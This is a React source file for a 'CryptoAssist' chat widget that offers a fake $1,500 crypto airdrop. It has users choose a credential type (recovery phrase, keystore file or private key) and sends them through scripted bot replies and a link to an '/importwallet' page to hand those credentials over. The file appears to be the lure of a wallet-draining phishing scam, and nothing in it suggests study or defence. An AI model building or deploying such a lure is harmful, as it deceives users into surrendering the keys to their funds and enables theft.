"use client"

import { useState } from "react"
import Link from "next/link"

interface Message {
  id: string
  text: string
  sender: "bot" | "user"
  timestamp: Date
}

const CREDENTIAL_TYPES = ["Recovery Phrase", "Keystore File", "Private Key"]

const CRYPTOS = [
  "Bitcoin (BTC)",
  "Ethereum (ETH)",
  "Cardano (ADA)",
  "Solana (SOL)",
  "Polkadot (DOT)",
  "Ripple (XRP)",
  "Litecoin (LTC)",
  "Chainlink (LINK)",
  "Polygon (MATIC)",
  "Avalanche (AVAX)",
  "Arbitrum (ARB)",
  "Optimism (OP)",
]

export default function LiveChat({ open, onOpenChange }: { open: boolean; onOpenChange: (open: boolean) => void }) {
  const [messages, setMessages] = useState<Message[]>([
    {
      id: "1",
      text: "Hello! Welcome to CryptoAssist. I can help you claim your $1,500 airdrop. Which cryptocurrency would you like to receive?",
      sender: "bot",
      timestamp: new Date(),
    },
  ])
  const [input, setInput] = useState("")
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null)
  const [selectedCredential, setSelectedCredential] = useState<string | null>(null)

  const handleSendMessage = async () => {
    if (!input.trim()) return

    const userMessage: Message = {
      id: Date.now().toString(),
      text: input,
      sender: "user",
      timestamp: new Date(),
    }
    setMessages((prev) => [...prev, userMessage])
    setInput("")

    if (input.toLowerCase().includes("claim") || input.toLowerCase().includes("airdrop")) {
      setTimeout(() => {
        const botMessage: Message = {
          id: (Date.now() + 1).toString(),
          text: `Great! To claim your $1,500 ${selectedCrypto || "airdrop"}, please visit our import wallet page. You'll need to provide your ${selectedCredential || "credentials"}. Click below to get started!`,
          sender: "bot",
          timestamp: new Date(),
        }
        setMessages((prev) => [...prev, botMessage])
      }, 500)
    } else {
      setTimeout(() => {
        const botMessage: Message = {
          id: (Date.now() + 1).toString(),
          text: `I can help you with your airdrop claim. Would you like to proceed with claiming your $1,500 ${selectedCrypto || "airdrop"}?`,
          sender: "bot",
          timestamp: new Date(),
        }
        setMessages((prev) => [...prev, botMessage])
      }, 500)
    }
  }

  if (!open) return null

  return (
    <div className="fixed inset-0 z-40 pointer-events-none">
      {/* Overlay */}
      <div className="absolute inset-0 bg-black/50 pointer-events-auto" onClick={() => onOpenChange(false)} />

      {/* Chat Widget */}
      <div className="absolute right-32 bottom-32 w-96 bg-blue-900 rounded-lg shadow-2xl flex flex-col h-96 pointer-events-auto border border-blue-800">
        {/* Header */}
        <div className="bg-gradient-to-r from-blue-950 to-blue-900 text-white p-4 flex justify-between items-center rounded-t-lg flex-shrink-0">
          <div>
            <h2 className="font-bold">CryptoAssist Chat</h2>
            <p className="text-cyan-400 text-xs">Claim $1,500 Instantly</p>
          </div>
          <button onClick={() => onOpenChange(false)} className="hover:bg-blue-800 p-1 rounded transition">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        {/* Crypto & Credential Selection */}
        <div className="px-4 py-3 border-b border-blue-800 bg-blue-800 flex-shrink-0 space-y-2">
          <select
            value={selectedCrypto || ""}
            onChange={(e) => setSelectedCrypto(e.target.value)}
            className="w-full px-3 py-2 border border-blue-700 rounded text-sm bg-blue-900 text-white focus:outline-none focus:border-cyan-500"
          >
            <option value="">Select cryptocurrency...</option>
            {CRYPTOS.map((crypto) => (
              <option key={crypto} value={crypto}>
                {crypto}
              </option>
            ))}
          </select>
          <select
            value={selectedCredential || ""}
            onChange={(e) => setSelectedCredential(e.target.value)}
            className="w-full px-3 py-2 border border-blue-700 rounded text-sm bg-blue-900 text-white focus:outline-none focus:border-cyan-500"
          >
            <option value="">Select credential type...</option>
            {CREDENTIAL_TYPES.map((cred) => (
              <option key={cred} value={cred}>
                {cred}
              </option>
            ))}
          </select>
        </div>

        {/* Messages */}
        <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-blue-900">
          {messages.map((message) => (
            <div key={message.id} className={`flex ${message.sender === "user" ? "justify-end" : "justify-start"}`}>
              <div
                className={`max-w-xs px-4 py-2 rounded-lg ${
                  message.sender === "user" ? "bg-cyan-500 text-blue-950" : "bg-blue-800 text-blue-100"
                }`}
              >
                <p className="text-sm">{message.text}</p>
              </div>
            </div>
          ))}
          {/* Add helpful link in messages */}
          <div className="px-4 py-3 bg-blue-800 rounded-lg text-center">
            <Link href="/importwallet" className="text-cyan-400 hover:text-cyan-300 font-semibold text-sm">
              Click here to import your wallet and claim $1,500
            </Link>
          </div>
        </div>

        {/* Input */}
        <div className="border-t border-blue-800 p-3 flex gap-2 flex-shrink-0">
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyPress={(e) => e.key === "Enter" && handleSendMessage()}
            placeholder="Ask about your airdrop..."
            className="flex-1 px-3 py-2 border border-blue-700 rounded bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 text-sm"
          />
          <button
            onClick={handleSendMessage}
            className="bg-cyan-500 hover:bg-cyan-600 text-blue-950 px-3 py-2 rounded transition font-semibold"
          >
            Send
          </button>
        </div>

        {/* Request Human Agent */}
        <div className="px-3 py-2 bg-blue-800 border-t border-blue-700 flex-shrink-0">
          <button className="w-full text-sm text-cyan-400 hover:text-cyan-300 font-semibold transition">
            Connect Human Agent for Verification
          </button>
        </div>
      </div>
    </div>
  )
}
